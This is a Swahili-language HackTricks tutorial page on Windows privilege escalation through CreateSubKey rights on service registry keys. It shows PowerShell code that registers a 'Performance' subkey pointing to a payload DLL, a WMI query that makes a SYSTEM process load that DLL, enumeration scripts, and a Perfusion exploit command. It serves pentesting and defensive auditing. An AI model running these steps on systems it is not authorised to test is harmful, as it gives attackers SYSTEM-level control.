# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Muhtasari

Ikiwa una **`Create Subkey`** / **`AppendData/AddSubdirectory`** pekee kwenye service registry key, hii bado ni fursa nzuri ya privesc. Kwa kawaida **huwezi** kubadilisha moja kwa moja `ImagePath`, `ServiceDll`, au values nyingine zilizopo, lakini bado unaweza kuunda child key ya **`Performance`** chini ya:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Key nyingine yoyote ya **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** ambapo token yako ina **`KEY_CREATE_SUB_KEY`**

Ujanja ni kwamba Windows bado inasaidia mfumo wa zamani wa usajili wa **PerfLib V1**. Ikiwa service ina subkey ya **`Performance`**, Windows inaweza kupakia DLL kutoka humo wakati performance counter consumer anaomba data.

Kulingana na nyaraka za Microsoft, usajili wa kiwango cha chini ni:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Kwa hiyo, **jambo muhimu kwa upande wa offensive ni: usipuuze finding ya service registry kwa sababu tu umepata `CreateSubKey` badala ya `SetValue`**.<sup>[[3]](#references)</sup>

## Kwa nini hii inatosha kwa code execution

Subkey ya `Performance` kwa kawaida **haipo kwa default kwenye services hizi**, kwa hiyo **`KEY_CREATE_SUB_KEY`** ndiyo primitive unayohitaji. Mara key inapoundwa na kuwa na `Library`/`Open`/`Collect`/`Close`, **performance counter consumer** yoyote inaweza kusababisha DLL load.<sup>[[3]](#references)</sup>

Maelezo machache muhimu:

- Value ya **`Library`** inaweza kuelekeza kwenye **full DLL path**.
- DLL lazima i-export **`OpenPerfData`**, **`CollectPerfData`**, na **`ClosePerfData`** na irudishe `ERROR_SUCCESS`.
- Code huendeshwa katika **context ya consumer**, **si lazima ndani ya service process yenye vulnerability yenyewe**.
- Katika hali ya kawaida ya `RpcEptMapper` / `Dnscache`, **WMI performance query** inaweza kusababisha **`wmiprvse.exe`** kupakia DLL kama **`NT AUTHORITY\SYSTEM`**.

Hii ndiyo sababu primitive hii ni rahisi kukosa wakati wa triage: parent service key si "fully writable", lakini bado inaweza kutumika kama weapon.

## Quick enumeration

Spot-check ya manual kwa kutumia **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Mfano wa PowerShell wa kutafuta principals wenye privileges za chini walio na **`CreateSubKey`** kwenye service keys:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Zana muhimu:

- **PrivescCheck**: `Get-ModifiableRegistryPath` iliundwa mahsusi kubaini aina hii ya tatizo.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: hujiendesha kiotomatiki kuweka DLL, kusajili `Performance`, kuanzisha WMI trigger, kufanya token duplication, na kusafisha kwenye targets za zamani zilizo hatarini (kwa mfano: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Mtiririko wa abuse

Unda subkey ya `Performance` na ujaze values zinazohitajika:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Kisha anzisha **privileged** performance consumer. Mfano wa kawaida ni WMI query kwenye `Win32_Perf*` classes:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Maelezo ya uendeshaji:

- Kuanzisha **`perfmon.exe`** ni muhimu kuthibitisha kuwa usajili wa counter ni sahihi, lakini kwa kawaida hii hupakia DLL katika **user context yako mwenyewe** pekee.
- Kwa LPE halisi, trigger consumer mwenye **privileges** kama **WMI**.
- Ikiwa unaandika exploit yako mwenyewe, kuanzisha `cmd.exe` moja kwa moja ndani ya DLL kwa kawaida hukuachia shell katika **session 0**. `Perfusion` hutatua hili kwa ku-duplicate token yenye privileges na kuiweka katika process iliyoundwa suspended ndani ya session ya mshambuliaji.<sup>[[4]](#references)</sup>
- Linganisha architecture ya DLL na consumer lengwa (**x64 kwenye mifumo ya x64**).

## Maelezo ya matoleo / maendeleo ya hivi karibuni

Kihistoria, weak keys zilizojengewa ndani zilikuwa:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` na `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` inaeleza kuwa updates za **Aprili 2021** ziliondoa njia rahisi ya exploitation kwenye **Windows 8 / Windows Server 2012** zilizokuwa updated, huku **Windows 7 / Windows Server 2008 R2** zikiendelea kuwa exploitable kupitia **`Dnscache`**.<sup>[[4]](#references)</sup>

Primitive hii **si ya kihistoria pekee**. Mnamo **Januari 2025**, Microsoft ilipatch issue inayohusiana ya AD DS ambapo wanachama wa **`Network Configuration Operators`** wangeweza kuunda subkeys chini ya **`Dnscache`** na **`NetBT`**, na wazo hilohilo la **Performance-counter DLL registration** lingeweza kutumiwa kufikia **SYSTEM** kwenye mifumo inayoungwa mkono.<sup>[[2]](#references)</sup>

Kwa hiyo, somo la kisasa ni la jumla: wakati wowote principal mwenye privileges ndogo anapokuwa na **`CreateSubKey`** kwenye **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, angalia ikiwa child key ya **`Performance`** inatosha kabla ya kupuuza finding hiyo.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
